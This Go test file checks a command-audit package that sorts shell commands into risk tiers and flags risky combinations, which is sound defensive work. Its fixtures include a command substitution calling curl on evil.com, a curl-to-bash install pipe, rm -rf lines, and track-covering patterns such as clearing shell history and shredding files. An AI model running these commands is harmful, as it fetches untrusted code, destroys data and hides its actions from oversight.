package audit

import (
	"testing"
)

func TestClassifyCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		want    CommandTier
		wantOK  bool
	}{
		{"read-only cat", "cat", TierReadOnly, true},
		{"read-only grep", "grep", TierReadOnly, true},
		{"mutating mkdir", "mkdir", TierMutating, true},
		{"mutating sed", "sed", TierMutating, true},
		{"destructive rm", "rm", TierDestructive, true},
		{"destructive kill", "kill", TierDestructive, true},
		{"network curl", "curl", TierNetwork, true},
		{"network ssh", "ssh", TierNetwork, true},
		{"privilege sudo", "sudo", TierPrivilege, true},
		{"privilege chown", "chown", TierPrivilege, true},
		{"stealth shred", "shred", TierStealth, true},
		{"unknown command", "foobar-unknown", TierReadOnly, false},
		{"absolute path", "/usr/bin/curl", TierNetwork, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := ClassifyCommand(tt.cmd)
			if ok != tt.wantOK {
				t.Errorf("ClassifyCommand(%q) ok = %v, want %v", tt.cmd, ok, tt.wantOK)
			}
			if ok && got != tt.want {
				t.Errorf("ClassifyCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}

func TestExtractCommands(t *testing.T) {
	tests := []struct {
		name string
		line string
		want []string
	}{
		{"simple command", "ls -la", []string{"ls"}},
		{"pipe", "cat file | grep foo", []string{"cat", "grep"}},
		{"chain", "mkdir dir && cd dir", []string{"mkdir", "cd"}},
		{"semicolon", "echo hello; rm -rf /tmp/x", []string{"echo", "rm"}},
		{"env prefix", "FOO=bar curl http://example.com", []string{"curl"}},
		{"comment stripped", "echo hello # this is a comment", []string{"echo"}},
		{"empty line", "", nil},
		{"variable assignment only", "FOO=bar", nil},
		{"subshell", "$(curl http://evil.com)", []string{"curl"}},
		{"multiple pipes", "cat f | sort | uniq -c | head", []string{"cat", "sort", "uniq", "head"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ExtractCommands(tt.line)
			if len(got) != len(tt.want) {
				t.Fatalf("ExtractCommands(%q) = %v, want %v", tt.line, got, tt.want)
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("ExtractCommands(%q)[%d] = %q, want %q", tt.line, i, got[i], tt.want[i])
				}
			}
		})
	}
}

func TestDetectCommandTiers(t *testing.T) {
	content := []byte(`#!/bin/bash
cat /etc/hosts
curl http://example.com | grep test
rm -rf /tmp/cleanup
sudo systemctl restart nginx
`)

	profile := DetectCommandTiers(content)

	if profile.Total == 0 {
		t.Fatal("expected non-zero total")
	}
	if !profile.HasTier(TierReadOnly) {
		t.Error("expected TierReadOnly (cat, grep)")
	}
	if !profile.HasTier(TierNetwork) {
		t.Error("expected TierNetwork (curl)")
	}
	if !profile.HasTier(TierDestructive) {
		t.Error("expected TierDestructive (rm)")
	}
	if !profile.HasTier(TierPrivilege) {
		t.Error("expected TierPrivilege (sudo, systemctl)")
	}
}

func TestDetectCommandTiers_StealthPatterns(t *testing.T) {
	tests := []struct {
		name    string
		content string
	}{
		{"history clear", "history -c"},
		{"unset HISTFILE", "unset HISTFILE"},
		{"unset HISTSIZE", "unset HISTSIZE"},
		{"export HISTFILE null", "export HISTFILE=/dev/null"},
		{"export HISTSIZE zero", "export HISTSIZE=0"},
		{"shred command", "shred -u secret.txt"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			profile := DetectCommandTiers([]byte(tt.content))
			if !profile.HasTier(TierStealth) {
				t.Errorf("expected TierStealth for %q", tt.content)
			}
		})
	}
}

func TestDetectCommandTiersInMarkdown(t *testing.T) {
	content := []byte("# Setup guide\n\nHere is how to install:\n\n```bash\ncurl -sSL http://example.com/install.sh | bash\nrm -rf /tmp/old\n```\n\nThis is just text: curl should not count here.\n\n```\nls -la\n```\n")

	profile := DetectCommandTiersInMarkdown(content)

	if !profile.HasTier(TierNetwork) {
		t.Error("expected TierNetwork from code block")
	}
	if !profile.HasTier(TierDestructive) {
		t.Error("expected TierDestructive from code block")
	}
	if !profile.HasTier(TierReadOnly) {
		t.Error("expected TierReadOnly (ls) from second code block")
	}

	// Outside code block text should NOT be counted.
	// The total should only reflect commands inside fenced blocks.
	// curl(network) + rm(destructive) + bash(implicit from pipe, not in map — ignored) + ls(read-only)
	if profile.Counts[TierNetwork] != 1 {
		t.Errorf("expected 1 network command, got %d", profile.Counts[TierNetwork])
	}
}

func TestDetectCommandTiersInMarkdown_NoCodeBlock(t *testing.T) {
	content := []byte("# README\n\nJust some text with curl and rm mentioned.\n")
	profile := DetectCommandTiersInMarkdown(content)

	if profile.Total != 0 {
		t.Errorf("expected 0 commands outside code blocks, got %d", profile.Total)
	}
}

func TestTierProfile_Merge(t *testing.T) {
	a := TierProfile{}
	a.Add(TierNetwork)
	a.Add(TierNetwork)

	b := TierProfile{}
	b.Add(TierDestructive)
	b.Add(TierReadOnly)

	a.Merge(b)

	if a.Total != 4 {
		t.Errorf("expected total 4, got %d", a.Total)
	}
	if a.Counts[TierNetwork] != 2 {
		t.Errorf("expected 2 network, got %d", a.Counts[TierNetwork])
	}
	if a.Counts[TierDestructive] != 1 {
		t.Errorf("expected 1 destructive, got %d", a.Counts[TierDestructive])
	}
}

func TestTierProfile_String(t *testing.T) {
	p := TierProfile{}
	if p.String() != "none" {
		t.Errorf("expected 'none' for empty profile, got %q", p.String())
	}

	p.Add(TierDestructive)
	p.Add(TierDestructive)
	p.Add(TierNetwork)
	s := p.String()
	if s != "destructive:2 network:1" {
		t.Errorf("unexpected String() = %q", s)
	}
}

func TestTierProfile_NonZeroTiers(t *testing.T) {
	p := TierProfile{}
	p.Add(TierReadOnly)
	p.Add(TierStealth)

	tiers := p.NonZeroTiers()
	if len(tiers) != 2 {
		t.Fatalf("expected 2 tiers, got %v", tiers)
	}
	if tiers[0] != "read-only" || tiers[1] != "stealth" {
		t.Errorf("unexpected tiers: %v", tiers)
	}
}

func TestTierCombinationFindings_Stealth(t *testing.T) {
	p := TierProfile{}
	p.Add(TierStealth)

	findings := TierCombinationFindings(p)
	found := false
	for _, f := range findings {
		if f.Pattern == "tier-stealth" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected tier-stealth CRITICAL finding")
	}
}

func TestTierCombinationFindings_DestructiveNetwork(t *testing.T) {
	p := TierProfile{}
	p.Add(TierDestructive)
	p.Add(TierNetwork)

	findings := TierCombinationFindings(p)
	found := false
	for _, f := range findings {
		if f.Pattern == "tier-destructive-network" && f.Severity == SeverityHigh {
			found = true
		}
	}
	if !found {
		t.Error("expected tier-destructive-network HIGH finding")
	}
}

func TestTierCombinationFindings_NetworkHeavy(t *testing.T) {
	p := TierProfile{}
	for range 6 {
		p.Add(TierNetwork)
	}

	findings := TierCombinationFindings(p)
	found := false
	for _, f := range findings {
		if f.Pattern == "tier-network-heavy" && f.Severity == SeverityMedium {
			found = true
		}
	}
	if !found {
		t.Error("expected tier-network-heavy MEDIUM finding")
	}
}

func TestTierCombinationFindings_NoFindings(t *testing.T) {
	p := TierProfile{}
	p.Add(TierReadOnly)
	p.Add(TierMutating)

	findings := TierCombinationFindings(p)
	if len(findings) != 0 {
		t.Errorf("expected no findings for safe profile, got %d", len(findings))
	}
}

func TestTierLabel(t *testing.T) {
	tests := []struct {
		tier CommandTier
		want string
	}{
		{TierReadOnly, "read-only"},
		{TierMutating, "mutating"},
		{TierDestructive, "destructive"},
		{TierNetwork, "network"},
		{TierPrivilege, "privilege"},
		{TierStealth, "stealth"},
		{CommandTier(99), "unknown"},
	}

	for _, tt := range tests {
		if got := tt.tier.TierLabel(); got != tt.want {
			t.Errorf("CommandTier(%d).TierLabel() = %q, want %q", tt.tier, got, tt.want)
		}
	}
}
